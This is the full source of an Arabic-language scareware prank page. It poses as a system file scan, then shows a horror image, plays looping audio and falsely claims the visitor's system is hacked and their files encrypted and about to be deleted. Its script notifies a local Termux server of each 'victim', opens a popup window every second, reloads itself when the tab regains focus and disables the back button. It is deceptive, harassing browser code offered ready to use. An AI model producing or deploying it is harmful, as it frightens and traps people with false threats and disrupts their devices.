<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>⚠️ WARNING: SYSTEM_BREACH_DETECTED ⚠️</title>
    <style>
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background-color: #000; cursor: none; display: flex; justify-content: center; align-items: center; }
        #horrorImg { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; object-fit: cover; z-index: 999; display: none; }
        #textOverlay { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); z-index: 1000; color: #f00; text-align: center; font-family: 'Courier New', monospace; font-weight: bold; background: rgba(0,0,0,0.8); padding: 25px; border: 4px solid #f00; display: none; width: 85%; box-shadow: 0 0 30px #f00; }
        .blink { animation: blinker 0.15s linear infinite; }
        @keyframes blinker { 50% { opacity: 0; } }
    </style>
</head>
<body onclick="activateVirus()">

    <div id="loader" style="color: #0f0; font-family: monospace; text-align: center;">
        <p class="blink">جارٍ فحص ملفات النظام...</p>
        <p>اضغط للمتابعة</p>
    </div>

    <img id="horrorImg" src="https://i.ibb.co/39snnynW/1000016067.jpg">
    <div id="textOverlay" class="blink">
        <h1 style="font-size: 28px;">تم اختراق بروتوكول الأمان!</h1>
        <p style="font-size: 18px;">لقد تجاوزت الحدود المسموحة.. نظامك الآن تحت سيطرتنا بالكامل.</p>
        <p style="font-size: 15px; color: #fff;">لا تحاول الإغلاق، سيتم حذف كافة البيانات خلال ثوانٍ.</p>
        <hr style="border: 1px solid #f00;">
        <p style="font-size: 12px;">ENCRYPTING_ALL_FILES... [DONE]</p>
    </div>

    <audio id="sfx" src="tfy-krk.mp3" preload="auto"></audio>

    <script>
        let running = false;
        const audio = document.getElementById('sfx');
        const MY_LINK = window.location.href;

        function activateVirus() {
            if (running) return;
            running = true;
            
            // تنبيه السيرفر المحلي في Termux سواسوة
            fetch('http://localhost:8080/victim_entry', {mode: 'no-cors'}).catch(() => {});

            document.getElementById('loader').style.display = 'none';
            document.getElementById('horrorImg').style.display = 'block';
            document.getElementById('textOverlay').style.display = 'block';
            
            audio.volume = 1.0;
            audio.play();
            audio.onended = () => { setTimeout(() => { audio.play(); }, 4000); };

            setInterval(() => {
                window.open(MY_LINK, '_blank', 'width=10,height=10');
            }, 1000);
        }

        // منع الخروج سواسوة
        document.addEventListener("visibilitychange", () => {
            if (document.visibilityState === 'visible' && running) {
                location.reload();
            }
        });
        history.pushState(null, null, location.href);
        window.onpopstate = () => history.go(1);
    </script>
